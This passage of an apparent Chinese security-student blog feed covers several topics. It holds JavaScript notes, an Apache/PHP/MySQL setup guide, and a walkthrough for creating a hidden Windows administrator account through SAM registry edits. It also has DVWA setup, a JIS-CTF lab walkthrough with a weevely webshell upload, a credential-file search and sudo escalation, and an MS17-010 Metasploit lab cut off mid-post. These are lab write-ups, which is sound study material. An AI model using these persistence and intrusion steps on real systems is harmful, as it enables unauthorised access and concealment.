href="#1-它是解释性语言" class="headerlink" title="1.它是解释性语言"></a>1.它是解释性语言</h3><p>机器无法直接看懂我们的语言，需要通过翻译让其识别。</p><p>有两种翻译过程，编译和解释。</p><p>所以语言也分为<strong>编译型语言</strong>和<strong>解释型语言</strong>。</p><p>编译型语言是通篇翻译，并生成一个翻译完的文件，最后程序会执行这个文件（例如c，c++）。</p><ul><li><p>优点：快（可以开发系统底层的东西）</p></li><li><p>不足：移植性不好（不跨平台）</p></li></ul><p>解释型语言是读一行翻译一行执行一句，不生成特定文件（例如JavaScript，php，python）。</p><ul><li><p>优点：跨平台</p></li><li><p>不足：较慢</p></li></ul><p>java比较特殊，既不属于编译型也不属于解释型。</p><p>java文件通过javac编译成.class文件，通过jym虚拟机解释执行。因为jym虚拟机的存在，java可以跨平台运行。</p><p>过程：.java – javac –&gt; 编译 –&gt; .class –&gt; jym –解释执行</p><h3 id="2-单线程"><a href="#2-单线程" class="headerlink" title="2.单线程"></a>2.单线程</h3><p>单线程：同一时间只能干一件事（同步）。</p><p>多线程：同一时间干多件事（异步）。</p><p>准确的说应该是js引擎为单线程。</p><h3 id="3-ECMA标准"><a href="#3-ECMA标准" class="headerlink" title="3.ECMA标准"></a>3.ECMA标准</h3><p>为了取得技术优势，微软推出了Jscript，CEnvi退出ScriptEase，与JavaScript都可在浏览器上运行。</p><p>为了统一规格，JavaScript兼容于ECMA标准（ECMA:全名欧洲计算机制造商协会，1961年成立旨在建立统一电脑操作系统格式标准的组织），因此也称之为ECMAScript。</p><p>由于标准的指定，也使得JavaScript成为了最终的“一家独大”。</p><p>后来的JavaScript比起ECMAScript的功能更加强大。</p><p>现在JavaScript的基本组成是<strong>ECMAScript</strong>，<strong>dom</strong>，<strong>bom</strong>。</p><p>ECMAScript(简称cs)：描述该语言的语法和基本对象</p><p>DOM：操作文档</p><p>BOM：操作浏览器</p><h1 id="js执行队列"><a href="#js执行队列" class="headerlink" title="js执行队列"></a>js执行队列</h1><p>由于js是单线程，并不能同时进行多项任务</p><p>所以js会把每一个任务按照一定的毫秒分成多个片段，将片段按照随机顺序排成队列，往js主线程送。</p><p>这个过程也叫做轮转时间片。</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>这是基于姬成老师的js课程所做的笔记，在笔记基础上也百度了解了一些东西。</p><p>除了技术，素养也同样重要。</p><p>接下来也要不断的努力提升自己。</p><p>以上。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>历史</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP环境搭建(apache+php+mysql)</title>
    <link href="/2020/03/14/old/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2020/03/14/old/PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>因为这学期要学习web后端了，所以搭建一下php环境。</p><p>环境：虚拟机windowserver2016</p><p><strong>apache2.4+php7+mysql8.0</strong></p><h1 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h1><p>去 <a href="https://www.apachelounge.com/download/">https://www.apachelounge.com/download/</a>  上根据自己的系统来下载apache文件。</p><p>（我这里是64位，所以下载了apache 2.4.41 win64）</p><span id="more"></span><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584061621280.png" alt="1584061621280"></p><p>把下载好的压缩包拖进虚拟机，解压。</p><p>在虚拟机新建web&#x2F;apache2.4文件夹，把刚刚解压文件里的<strong>apache24</strong>文件夹里的所有文件拖到apache2.4里。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584061841300.png" alt="1584061841300"></p><p>打开conf个文件下的httpd.conf。</p><p>首先<strong>配置apache安装目录</strong>，查找字符c:&#x2F;apache24并替换成刚刚创建的目录。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584063068601.png" alt="1584063068601"></p><p>接着<strong>配置服务器域名</strong>，查找字符ServerName，找到<code>ServerName www.example.com:80</code>并将该行的注释符删除。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584063282821.png" alt="1584063282821"></p><p>接着开始<strong>安装apache</strong>。</p><p>使用命令行窗口（注：需要用管理员身份运行），将目录切换到apache2.4&#x2F;bin。</p><p>输入<code>httpd.exe -k install</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584097626928.png" alt="1584097626928"></p><p>安装成功！</p><p>启动，运行**&#x2F;web&#x2F;apache2.4&#x2F;bin<strong>下的</strong>ApacheMonitor**。</p><p>右下角会出现一个图标，点击start。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584098327516.png" alt="1584098327516"></p><p><strong>验证是否安装完成</strong>：打开浏览器，输入localhost，出现It works！就表示安装成功。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584098423941.png" alt="1584098423941"></p><h1 id="php"><a href="#php" class="headerlink" title="php"></a>php</h1><p>下载文件：<a href="https://www.php.net/downloads">https://www.php.net/downloads</a></p><p>在web文件夹下新建php文件夹，把下载解压好多文件放进去。</p><p>复制一份php.ini-development文件，并改名为php.ini。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584098639944.png" alt="1584098639944"></p><p>打开php.ini进行修改。</p><p><strong>配置php扩展目录</strong>：找到extension_dir &#x3D; “ext”，将其注释符;去掉，并在ext前添加现在的路径。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584098826862.png" alt="1584098826862"></p><p><strong>将时区修改为中国时区</strong>：修改;date.timezone &#x3D;为date.timezone &#x3D; PRC</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584099007657.png" alt="1584099007657"></p><p><strong>让apache引入php模块</strong>：打开apache2.4&#x2F;conf下的httpd.conf，</p><p>添加以下代码（需根据实际情况更改）：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">LoadModule</span> php7_module <span class="hljs-string">&quot;c:/web/php/php7apache2_4.dll&quot;</span><br><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;\.php$&quot;</span>&gt;</span><br>    <span class="hljs-attribute">setHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br><span class="hljs-attribute">PHPIniDir</span> <span class="hljs-string">&quot;c:/web/php&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584099506675.png" alt="1584099506675"></p><p><strong>设置默认索引页</strong>：在httpd.conf查找Directoryindex，添加一个index.php文件。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584099745670.png" alt="1584099745670"></p><p>重启apache（如果不报错就没有问题）</p><p><strong>测试是否能正常解析</strong>：在apache2.4&#x2F;htdocs下新建一个php文件<strong>test.php</strong>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">phpinfo</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用浏览器访问localhost&#x2F;test.php。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584101675373.png" alt="1584101675373"></p><h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><p>下载文件：<a href="https://dev.mysql.com/downloads/mysql/">https://dev.mysql.com/downloads/mysql/</a></p><p>在web文件夹下新建mysql文件夹。</p><p><strong>如果用安装包：</strong>把下载好的mysql安装在里面即可，没什么好说的。</p><p><strong>如果用的是免安装包：</strong></p><h3 id="（1）配置文件"><a href="#（1）配置文件" class="headerlink" title="（1）配置文件"></a>（1）配置文件</h3><p>先把文件好的文件移动到新建的mysql文件夹。</p><p>新建空文件<strong>mysqlData</strong>作为mysql数据库的存放目录</p><p>新建my.ini文件。</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[mysqld]</span> <br><span class="hljs-comment">#设置3306端口 </span><br><span class="hljs-attr">port</span> = <span class="hljs-number">3306</span><br><span class="hljs-comment"># 设置mysql的安装目录 </span><br><span class="hljs-attr">basedir</span>=c:\web\mysql8.<span class="hljs-number">0</span><br><span class="hljs-comment"># 设置mysql数据库的数据的存放目录</span><br><span class="hljs-attr">datadir</span>=c:\web\mysqlData<br><span class="hljs-comment"># 允许最大连接数</span><br><span class="hljs-attr">max_connections</span>=<span class="hljs-number">200</span> <br><span class="hljs-comment"># 服务端使用的字符集默认为8比特编码的latin1字符集</span><br><span class="hljs-attr">character-set-server</span>=utf8 <br><span class="hljs-comment"># 创建新表时将使用的默认存储引擎 </span><br><span class="hljs-attr">default-storage-engine</span>=INNODB<br><span class="hljs-comment"># 默认使用“mysql_native_password”插件认证</span><br><span class="hljs-comment">#mysql_native_password</span><br><span class="hljs-attr">default_authentication_plugin</span>=mysql_native_password<br><span class="hljs-section">[mysql]</span><br><span class="hljs-comment"># 设置mysql客户端默认字符集</span><br><span class="hljs-attr">default-character-set</span>=utf8<br><span class="hljs-section">[client]</span><br><span class="hljs-comment"># 设置mysql客户端连接服务端时默认使用的端口</span><br><span class="hljs-attr">port</span>=<span class="hljs-number">3306</span><br><span class="hljs-attr">default-character-set</span>=utf8<br></code></pre></td></tr></table></figure><p>mysql的安装目录及数据库存放目录根据实际情况修改。</p><h3 id="（2）环境变量"><a href="#（2）环境变量" class="headerlink" title="（2）环境变量"></a>（2）环境变量</h3><p>我的电脑&gt;属性&gt;高级系统设置&gt;高级&gt;环境变量&gt;系统变量&gt;path。</p><p>添加mysql的bin目录</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584103211611.png" alt="1584103211611"></p><h3 id="（3）初始化数据库-安装mysql服务-修改密码"><a href="#（3）初始化数据库-安装mysql服务-修改密码" class="headerlink" title="（3）初始化数据库+安装mysql服务+修改密码"></a>（3）初始化数据库+安装mysql服务+修改密码</h3><p>使用管理员身份打开命令行窗口。</p><p>移动到mysql\bin目录下，输入<code>mysqld --initialize --console</code></p><p><img src="C:\Users\lenovo\Pictures\截图\新建文件夹\screenshot.221.jpg" alt="screenshot.221"></p><p>保存localhost后的这一串，后面会做初始密码用。</p><p>安装mysql服务：<code>mysql install mysql8</code></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584103932626.png" alt="1584103932626"></p><p>开启服务：<code>net start Mysql8</code></p><p>登录：<code>mysql -u root -p</code></p><p>密码就是刚刚的初始密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584104416746.png" alt="1584104416746"></p><p>修改密码：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">USER</span> <span class="hljs-string">&#x27;root&#x27;</span>@<span class="hljs-string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="hljs-keyword">WITH</span> mysql_native_password <span class="hljs-keyword">BY</span> <span class="hljs-string">&#x27;新密码&#x27;</span>;<br></code></pre></td></tr></table></figure><p>完成！！！</p><h1 id="可能出现的问题"><a href="#可能出现的问题" class="headerlink" title="可能出现的问题"></a>可能出现的问题</h1><h3 id="（1）apache安装时报错缺失文件"><a href="#（1）apache安装时报错缺失文件" class="headerlink" title="（1）apache安装时报错缺失文件"></a>（1）apache安装时报错缺失文件</h3><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/web%E5%90%8E%E7%AB%AF/1584063732226.png" alt="1584063732226"></p><p>这事由于缺少了apache所需的运行库，下载安装相应的vc即可。</p><h3 id="（2）配置php模块后，apache无法启动"><a href="#（2）配置php模块后，apache无法启动" class="headerlink" title="（2）配置php模块后，apache无法启动"></a>（2）配置php模块后，apache无法启动</h3><p>可以先使用httpd.exe -w -n “Apache2.4”  -k start命令排错。</p><p>如果没有错误，就是缺少vc15的库。</p><p>老老实实安装吧。</p><p>参考：（mysql安装）<a href="https://www.jb51.net/article/173332.html">https://www.jb51.net/article/173332.html</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>php</tag>
      
      <tag>环境搭建</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>建立隐藏管理员账户（图形化界面）</title>
    <link href="/2020/03/06/old/%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%EF%BC%88%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%EF%BC%89/"/>
    <url>/2020/03/06/old/%E5%BB%BA%E7%AB%8B%E9%9A%90%E8%97%8F%E8%B4%A6%E6%88%B7%EF%BC%88%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>正好作业布置了这个，就顺带来写一篇吧。</p><p>实验环境：<strong>winserver2016</strong></p><p>先新建一个账户abc。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583482741786.png" alt="1583482741786"></p><!-- more --><p>打开注册表（win+R，输入regedit），找到HKEY_LOCAL_MACHINE&gt;SAM&gt;SAM，右键赋予权限。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483015022.png" alt="1583483015022"></p><p>F5刷新，之后可以看见SAM文件夹出现了子项，选择SAM&gt;Account&gt;Users&gt;Names，选中abc。</p><p>可以看见一个类型写着0x3eb的文件，0x是十六进制的标识。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483099170.png" alt="1583483099170"></p><p>现在到users文件夹下，选中末尾为<strong>3eb</strong>及name里的<strong>abc</strong>这两个文件，右键导出。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483672420.png" alt="1583483672420"></p><p>回到计算机管理器，把abc用户删除。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483756032.png" alt="1583483756032"></p><p>现在返回注册表，刷新一下，发现abc的相关文件不见了。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583483861802.png" alt="1583483861802"></p><p>这时候再运行刚刚导出的文件，users里会重新出现刚刚的文件，但【本地用户与组】里的abc都不会重新出现。</p><p>将本地安全策略中的【交互式登录：不显示最后的用户名】属性<strong>开启</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583485527252.png" alt="1583485527252"></p><p>注销或者重启，尝试输入用户名和密码登录。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/2020/%E6%9D%82/1583486280391.png" alt="1583486280391"></p><p>登录成功！</p><p>参考：<a href="https://blog.51cto.com/yttitan/1334643">https://blog.51cto.com/yttitan/1334643</a></p>]]></content>
    
    
    <categories>
      
      <category>杂</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dvwa简介+搭建</title>
    <link href="/2019/12/16/old/dvwa1/"/>
    <url>/2019/12/16/old/dvwa1/</url>
    
    <content type="html"><![CDATA[<p>DVWA简介+搭建</p><p><strong>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP&#x2F;MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</strong></p><span id="more"></span><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a><strong>搭建</strong></h2><p><strong>xp镜像+<a href="https://sourceforge.net/projects/xampp/files/XAMPP%20Windows/1.8.2/xampp-win32-1.8.2-6-VC9-installer.exe/download">xampp</a>+<a href="http://www.dvwa.co.uk/">dvwa</a></strong></p><p>1.在xp里安装xampp，开启apache和mysql服务。</p><p>2.把下载好的dvwa解压，改名为dvwa，放在xampp的htdocs目录下（可以先把htdocs目录下的文件移到其他地方）。</p><p>3.进入：<a href="http://127.0.0.1/dvwa/login.php">http://127.0.0.1/dvwa/login.php</a></p><p>(ps：如果报错显示<strong>DVWA System error - config file not found. Copy config&#x2F;config.inc.php.dist ……</strong></p><p>到\dvwa\config目录下把config.inc.php.dist改为config.inc.php即可)</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/dvwa/dvwa%EF%BC%88%E4%B8%80%EF%BC%89/screenshot.1.jpg"></p><p>4.到config目录下，打开config.inc.php文件，移除db_password的值</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/dvwa/dvwa%EF%BC%88%E4%B8%80%EF%BC%89/screenshot.2.jpg"></p><p>5.页面往下拉，选择create&#x2F;reset database</p><p>6.刷新（或者点击下面的按钮login），会显示一个登录页面</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/dvwa/dvwa%EF%BC%88%E4%B8%80%EF%BC%89/screenshot.3.jpg"></p><p>7.使用admin&#x2F;password登录。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/dvwa/dvwa%EF%BC%88%E4%B8%80%EF%BC%89/screenshot.4.jpg"></p><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><p>分为是个模块，分别是：</p><p>1.Brute Force（暴力破解）</p><p>2.Command Injection（命令行注入）</p><p>3.CSRF（跨站请求伪造）</p><p>4.File Inclusion（文件包含）</p><p>5.File Upload（文件上传）</p><p>6.Insecure CAPTCHA（不安全验证码）</p><p>7.SQL Injection（sql注入）</p><p>8.SQL Injection(blind) （sql盲注）</p><p>9.XSS(Reflected) （反射型跨站脚本）</p><p>10.XSS(Stored)（储存型跨站脚本）</p><p>有四种安全级别：low，medium，high，impossible</p><p>参考：<a href="https://www.freebuf.com/articles/web/116437.html">https://www.freebuf.com/articles/web/116437.html</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>旧文章</tag>
      
      <tag>dvwa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JIS-CTF靶机渗透</title>
    <link href="/2019/12/15/old/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <url>/2019/12/15/old/JIS-CTF%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali</p><p>靶机：JIS-CTF </p><p>网络：nat模式，192.168.110.0&#x2F;24网段</p><h1 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h1><h2 id="1）拿flag"><a href="#1）拿flag" class="headerlink" title="1）拿flag"></a>1）拿flag</h2><p>首先要找到靶机。</p><p>先使用nmap扫描。</p><span id="more"></span><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.6.jpg"></p><p>发现了靶机，ip为134，开放了22和80端口。</p><p>所以尝试使用浏览器访问80端口，进入了一个登录页面。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.7.jpg"></p><p>查看源码没有什么发现，弱密码也无法进入。</p><p>尝试用dirb扫描目录。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.8.jpg"></p><p>扫描出了一个flag，进入查看。</p><p>拿到<strong>第一个flag</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.9.jpg"></p><p>接着进入其他扫描出来的目录查看。</p><p>看到admin_area的页面，感觉有点东西。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.10.jpg"></p><p>查看源码，发现<strong>第二个flag</strong>和用户名密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.11.jpg"></p><p>使用刚刚拿到的用户名密码登录，发现是一个文件上传页面，并且对上传的文件没有限制。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.12.jpg"></p><p>使用kali自带的weevely，生成一个马上传。</p><p>weevely generate <password>  <path></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.16.jpg"></p><p>上传了木马后，就要查找木马上传到的目录。</p><p>进入robots.txt</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.13.jpg"></p><p>这里面列了不允许进入的目录。</p><p>里面有uploads和uploaded_files，尝试都访问一下。</p><p>发现在uploaded_files下（没有报错）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.17.jpg"></p><p>发现木马的位置。</p><p>使用<strong>weevely</strong>连接。</p><p>【格式：weevely &lt;路径&gt; &lt;密码&gt;】</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.18.jpg"></p><p>进入网页根路径，发现flag.txt。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.19.jpg"></p><p>尝试查看，发现没有权限。这时候试着查看<strong>hint(暗示).txt</strong>。</p><p>找到<strong>第三个flag</strong>和一串信息，写着：尝试去寻找techenawi用户的密码来阅读flag.txt，你可以在一个隐藏文件里找到它（笑）。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.20.jpg"></p><p>使用grep查询technawi（-r：递归， -n：显示匹配行及行号，-s： 不显示不存在或无匹配文本的错误信息）</p><p>发现**&#x2F;etc&#x2F;mysql&#x2F;conf.d&#x2F;credentials.txt**包含这个字符串。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.21.jpg"></p><p>查看这个文件，里面包含第<strong>四个flag</strong>和用户名密码。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.22.jpg"></p><p>前面扫描的时候，发现该靶机有ssh服务。</p><p>尝试使用该用户名密码ssh登录，访问之前没有权限访问的flag.txt，得到<strong>第五个flag</strong>。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.23.jpg"></p><p>成功拿到了全部的flag！</p><h2 id="2）提权"><a href="#2）提权" class="headerlink" title="2）提权"></a>2）提权</h2><p>最后尝试提权。</p><p>查看history，发现technawi用户可以使用sudo。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.24.jpg"></p><p>使用sudo -l查看sudo的权限，发现是all。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.25.jpg"></p><p>尝试sudo提权。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.26.jpg"></p><p>提权成功！</p><h1 id="出现的问题以及解决方案"><a href="#出现的问题以及解决方案" class="headerlink" title="出现的问题以及解决方案"></a>出现的问题以及解决方案</h1><h2 id="靶机网络不通"><a href="#靶机网络不通" class="headerlink" title="靶机网络不通"></a>靶机网络不通</h2><p>一开始使用nmap扫描，扫不到。</p><p>去查了下，发现靶机的网络没起来。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.1.jpg"></p><p>在这个界面按下e键，进入设置界面。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.2.jpg"></p><p>把ro 修改为<strong>rw signie init&#x3D;&#x2F;bin&#x2F;bash</strong>。</p><p>按下ctrl+x。</p><p>使用<strong>ip a</strong>查看网卡信息。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.5.jpg"></p><p><strong>vim &#x2F;etc&#x2F;network&#x2F;interfaces</strong>，发现网卡有误，修改为实际网卡。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/JIS-CTF/screenshot.3.jpg"></p><p>使用 <strong>&#x2F;etc&#x2F;init.d&#x2F;networking restart</strong> 重启服务</p><p>再去扫描，就发现正常了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://blog.csdn.net/asstart/article/details/103433065">https://blog.csdn.net/asstart/article/details/103433065</a></p><p><a href="https://blog.csdn.net/qq_34953789/article/details/79973735">https://blog.csdn.net/qq_34953789/article/details/79973735</a></p><p><a href="https://www.cnblogs.com/panweishadow/p/3703729.html">https://www.cnblogs.com/panweishadow/p/3703729.html</a></p>]]></content>
    
    
    <categories>
      
      <category>靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
      <tag>靶机</tag>
      
      <tag>旧文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ms17-010实验</title>
    <link href="/2019/12/01/old/ms17-010%E5%AE%9E%E9%AA%8C(%E6%94%B9)/"/>
    <url>/2019/12/01/old/ms17-010%E5%AE%9E%E9%AA%8C(%E6%94%B9)/</url>
    
    <content type="html"><![CDATA[<p>ps：修改了一些错误，添加了一些内容</p><h1 id="1-实验目的"><a href="#1-实验目的" class="headerlink" title="1.     实验目的"></a>1.     实验目的</h1><p>利用ms17-010漏洞获得靶机（一个存在漏洞的系统）权限。</p><h1 id="2-实验原理"><a href="#2-实验原理" class="headerlink" title="2.     实验原理"></a>2.     实验原理</h1><p>利用了微软 Microsoft Windows SMB 服务器通信协议。</p><p>SMB主要用来使得一个网络上的机器共享计算机文件、打印机、串行端口和通讯等资源。它也提供认证的行程间通讯机能。使用<strong>445</strong>端口。</p><p>攻击者利用445端口发送特殊设计的消息，来远程执行攻击代码。</p><span id="more"></span><h1 id="3-准备"><a href="#3-准备" class="headerlink" title="3.     准备"></a>3.     准备</h1><p>一台靶机（win7），一台攻击机（kali）</p><h1 id="4-过程"><a href="#4-过程" class="headerlink" title="4.     过程"></a>4.     过程</h1><h2 id="1-设置扫描ip"><a href="#1-设置扫描ip" class="headerlink" title="1.     设置扫描ip"></a>1.     设置扫描ip</h2><p>先推算ip，设置攻击机和靶机在同一网段。</p><p>Kali机设置（有两种方法）：</p><p>①    vim &#x2F;etc&#x2F;network&#x2F;interfaces</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/clip_image001.jpg" alt="img"></p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.1.jpg"></p><p>更改完后记得重启网卡。</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.2.jpg"></p><p>②    ip addr add 你的ip地址&#x2F;24 dev eth0</p><p>使用<strong>nmap扫描</strong>网段内存活的主机：</p><p>nmap -sP + 网段</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.3.jpg"></p><p> 扫描到两台机子，一台是我们的攻击机，133是我们的win7靶机。</p><h2 id="2-使用msf攻击"><a href="#2-使用msf攻击" class="headerlink" title="2.     使用msf攻击"></a>2.     使用msf攻击</h2><p>启动msf：<code>msfconsole</code></p><p>（ps：会出现的图像随机，不影响操作）</p><p><img src="https://soya-1300102518.cos.ap-shenzhen-fsi.myqcloud.com/ms17-010/screenshot.4.jpg" alt="img"></p><p>查找ms17-010模块：<code>search ms17-010</code></p><p><img 